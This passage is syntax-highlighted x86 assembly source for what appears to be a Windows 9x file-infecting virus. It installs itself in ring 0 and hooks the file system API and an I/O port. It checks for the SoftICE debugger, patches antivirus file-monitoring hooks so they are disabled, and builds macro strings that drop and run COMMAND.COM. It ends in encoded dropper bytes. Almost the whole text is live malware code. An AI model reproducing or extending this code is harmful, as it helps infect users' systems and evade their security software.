        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_AVXD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc12">'DIPS'</span><span class="sc0">  </span><span class="sc1">;SPIDER?</span><span class="sc0">
</span><span class="sc5">IS_AVXD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">IO_CALLBACK</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc1">;ENTRY: ECX - IN(OUT)PUT TYPE (IGNORE OTHER DATA STRUC)</span><span class="sc0">
</span><span class="sc1">;EXIT: EAX - PORT DATA</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_IO_CALLBACK</span><span class="sc0">
        </span><span class="sc5">BREAK</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">         </span><span class="sc1">;BYTE_INPUT?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_NO_ME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">WE_HERE</span><span class="sc0">      </span><span class="sc1">;WE'RE HERE!</span><span class="sc0">
</span><span class="sc5">IS_NO_ME</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_RANDOM_MSK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">14</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOVZX</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: EAX=(LIMIT-1) OR EAX=0 IF INFINITY,EDX=CODE DELTA IN MEMORY</span><span class="sc0">
</span><span class="sc1">;EXIT: EAX=RANDOM VALUE, ZF=1 IF ZERO</span><span class="sc0">
</span><span class="sc5">GET_RANDOM</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RANDOMIZE</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc2">3A7FDH</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">269EC3H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RANDOMIZE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_LIMIT</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
</span><span class="sc5">NO_LIMIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FIND_FREE_SEL</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;EBX=0,EDI=LDT CUR POS</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_FREE_SEL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FREE_SEL</span><span class="sc0">
</span><span class="sc5">NO_FREE_SEL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SCASD</span><span class="sc0">
        </span><span class="sc6">SCASD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">FIND_FREE_SEL</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">FREE_SEL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">         </span><span class="sc1">;ESI=LDT LINEAR ADDRESS</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">111B</span><span class="sc0">         </span><span class="sc1">;LDT/RPL=3</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">PE_OFF_R0_INSTALL</span><span class="sc0">
</span><span class="sc5">RING0_INSTALL</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc5">BREAK</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OLD_PECODE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_LOADER</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">WE_HERE</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">MAKE_INSTALL</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_R0_INSTALL</span><span class="sc0">
</span><span class="sc5">MAKE_INSTALL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">BREAK</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc5">ENTERD</span><span class="sc0">  </span><span class="sc5">STACK_FRAME</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_DELTA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc5">CLI_VXD_CALL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">WINICE_ID</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc5">GET_DDB</span><span class="sc0">     </span><span class="sc1">;18146H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">GO_ERROR</span><span class="sc0">        </span><span class="sc1">;TEST IF WINICE INSTALLED</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_PAGERESERVE</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0"> </span><span class="sc1">;1811DH</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">PR_FIXED</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">TOTAL_PAGE_NUM</span><span class="sc0"> </span><span class="sc5">PR_SYSTEM</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">         </span><span class="sc1">;RESERVE MEMORY PAGES</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;_PAGECOMMIT=1811EH</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc5">GO_ERROR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc10">ERROR</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CDQ</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PC_FIXED</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc5">PD_FIXEDZERO</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">TOTAL_PAGE_NUM</span><span class="sc0">
        </span><span class="sc6">SHLD</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;COMMIT RESERVED MEMORY PAGES</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_FREE_PAGE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc5">OUR_LEN</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc5">OFF_IO_CALLBACK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc5">OUR_PORT</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">INSTALL_IO_HANDLER</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;HOOK PORT</span><span class="sc0">
</span><span class="sc5">GO_FREE_PAGE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">FREE_PAGE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SET_TIME</span><span class="sc0">        </span><span class="sc1">;INIT FIRST INF_TIME</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GET_DATE_AND_TIME</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">RANDOMIZE</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">  </span><span class="sc1">;INIT RANDOMIZE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GET_CONFIG_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;STORE &amp;%WINDIR%</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">SYS_PATH</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">OFF_IFS_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc5">INSTALLAPIHOOK</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;HOOK FILESYSTEMAPI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OLD_IFS_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc5">OFF_IAPI_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;HOOK INSTALLFILESYSTEMAPIHOOK</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OLD_IAPI_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">EDX</span><span class="sc0">
</span><span class="sc5">SCAN_CHAIN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_VXD_HOOK</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">NO_VXD_MEM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_AV_HOOKER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc2">1234H</span><span class="sc0">   </span><span class="sc1">;DISABLE AV FILE MONITORING</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12345678H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">NO_AV_HOOKER</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc12">'MSFI'</span><span class="sc0">  </span><span class="sc1">;IFSMGR?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SCAN_CHAIN</span><span class="sc0">
</span><span class="sc5">NO_VXD_MEM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OFF_RAPI_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">REMOVEAPIHOOK</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">0FFFF7FFFH</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">HOOK_DEVICE_SERVICE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">         </span><span class="sc1">;HOOK REMOVEFILESYSTEMAPIHOOK</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OLD_RAPI_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">ERROR</span><span class="sc0">
</span><span class="sc5">FREE_PAGE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc5">_PAGEFREE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">LEAVED</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;INIT DATA AREA</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">CHK_NT</span><span class="sc0">
</span><span class="sc5">RELO_CHK_NT</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"IF(NOT(FE(`C:\\"</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"NTLDR"</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"NTLD_"</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">".')),`"</span><span class="sc0">
</span><span class="sc5">LEN_CHK_NT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RELO_CHK_NT</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RR_MACRO</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'RR("KERNEL32","Sleep","U")'</span><span class="sc4">,</span><span class="sc3">"')"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">DROP_MACRO</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"EF(`COMMAND.COM',"</span><span class="sc4">,</span><span class="sc12">'"/CECHO '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SLEEP_MACRO</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"Sleep(550)')"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">EXEC_MACRO_1</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"EF(`"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXEC_2</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"',qchPath,0)')"</span><span class="sc0">
</span><span class="sc5">LEN_EXEC_2</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EXEC_2</span><span class="sc0">

</span><span class="sc1">;DOSDROP.COM START</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RUN_DROPPER</span><span class="sc0">
</span><span class="sc5">RUN_DROPPER_LB</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc2">2CH</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">5EH</span><span class="sc4">,</span><span class="sc2">6AH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">5BH</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc4">,</span><span class="sc2">51H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">6DH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">30H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">6EH</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">70H</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">73H</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">76H</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">76H</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">7DH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">5FH</span><span class="sc4">,</span><span class="sc2">2CH</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc2">6AH</span><span class="sc4">,</span><span class="sc2">44H</span><span class="sc4">,</span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc2">34H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">59H</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc0">
</span><span class="sc5">UU_MASK</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RUN_DROPPER_LB</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc12">'AA'</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc2">56H</span><span class="sc4">,</span><span class="sc2">5FH</span><span class="sc4">,</span><span class="sc2">29H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">7EH</span><span class="sc4">,</span><span class="sc2">72H</span><span class="sc4">,</span><span class="sc2">5EH</span><span class="sc4">,</span><span class="sc2">23H</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc2">7FH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">7EH</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">70H</span><span class="sc4">,</span><span class="sc2">7EH</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc0">
